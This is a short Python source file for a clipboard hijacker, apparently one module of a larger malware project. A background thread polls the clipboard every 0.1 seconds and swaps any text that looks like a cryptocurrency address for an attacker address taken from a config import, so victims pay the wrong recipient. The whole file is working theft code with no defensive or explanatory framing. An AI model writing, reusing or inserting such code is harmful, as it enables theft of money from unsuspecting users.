import threading
import pyperclip
import re
import time
from co.config import CRYPTO_ADDRESS

def clips():
    def is_valid_crypto_address(address):
        return bool(re.match(r'^[A-Za-z0-9]{26,45}$', address))

    def clipboard_listener():
        last_clipboard_content = ""
        while True:
            current_content = pyperclip.paste()
            if current_content != last_clipboard_content:
                last_clipboard_content = current_content
                if is_valid_crypto_address(current_content):
                    pyperclip.copy(CRYPTO_ADDRESS)
            time.sleep(0.1)

    threading.Thread(target=clipboard_listener, daemon=True).start()
#dont edit this